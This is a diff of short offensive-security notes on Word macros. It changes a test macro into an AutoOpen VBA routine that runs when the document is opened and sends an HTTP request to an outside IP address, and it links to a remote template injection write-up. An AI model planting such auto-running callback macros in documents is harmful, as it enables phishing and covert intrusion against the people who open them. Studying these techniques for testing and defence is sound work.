@@ -2,14 +2,16 @@
 2. Templates: https://blog.sunggwanchoi.com/remote-template-injection/
 
 
-1. Open word doc, Alt+F8 Open macro, F5 Run. 
-Sub Test()
+1. Open word doc, Alt+F8 Open macro, F5 Run. Key word AutoOpen runs on opening doc. 
+
+Sub AutoOpen()
 '
 Dim xHttp
 Set xHttp = CreateObject("Microsoft.XMLHTTP")
 xHttp.Open "GET", "http://1.1.1.1/Does-not-exist.txt", False
 xHttp.Send
-' Test Macro
+' AutoOpen
 End Sub
 
+You may want to auto-exec. File > Options > Cust Ribbon > Enable Developer
 2. https://blog.sunggwanchoi.com/remote-template-injection/
